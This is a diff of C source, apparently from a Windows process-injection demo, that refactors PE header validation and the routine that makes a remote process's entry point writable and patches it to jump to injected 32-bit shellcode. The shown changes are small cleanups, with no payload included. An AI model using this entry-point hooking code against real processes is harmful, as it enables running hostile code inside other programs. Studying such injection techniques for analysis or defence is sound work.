@@ -4,13 +4,15 @@
 
 #define PAGE_SIZE 0x1000
 
-IMAGE_NT_HEADERS* get_nt_hrds(BYTE *read_proc)
+IMAGE_NT_HEADERS* get_nt_hrds(BYTE *pe_buffer)
 {
-    IMAGE_DOS_HEADER *idh = NULL;
-    IMAGE_NT_HEADERS *inh = NULL;
+    if (pe_buffer == NULL) return NULL;
 
-    idh = (IMAGE_DOS_HEADER*)read_proc;
-    inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
+    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
+    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
+        return NULL;
+    }
+    IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + idh->e_lfanew);
     return inh;
 }
 
@@ -18,15 +20,10 @@ bool is_target_injectable(BYTE* hdrs_buf)
 {
     if (hdrs_buf == NULL) return false;
 
-    // verify read content:
-    if (hdrs_buf[0] != 'M' || hdrs_buf[1] != 'Z') {
-        printf("[-] MZ header check failed\n");
-        return false;
-    }
-    //check if supported type
     IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
     if (inh == NULL) return false;
 
+    //check if supported type
     if (inh->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
         printf("[WARNING] Not supported type! This example contains 32 bit shellcode and supports only injections to 32bit executables\n");
         return false;
@@ -79,15 +76,16 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
     DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
     printf("EP = 0x%x\n", ep_rva);
 
+    const SIZE_T kHookSize = 0x10;
+    BYTE hook_buffer[kHookSize];
+    memset(hook_buffer, 0xcc,sizeof(hook_buffer));
+
     //make a memory page containing Entry Point Writable:
     DWORD oldProtect;
-    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, PAGE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, kHookSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         printf("Virtual Protect Failed!\n");
         return false;
     }
-
-    BYTE hook_buffer[0x10];
-    memset(hook_buffer, 0xcc,sizeof(hook_buffer));
 
     printf("Entry Point v: %p\n", ep_rva);
     printf("shellcode ptr: %p\n", remote_shellcode_ptr);
@@ -111,7 +109,7 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
 
     //restore the previous access rights at entry point:
     DWORD oldProtect2;
-    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, PAGE_SIZE, oldProtect, &oldProtect2)) {
+    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, kHookSize, oldProtect, &oldProtect2)) {
         printf("Virtual Protect Failed!\n");
         return false;
     }
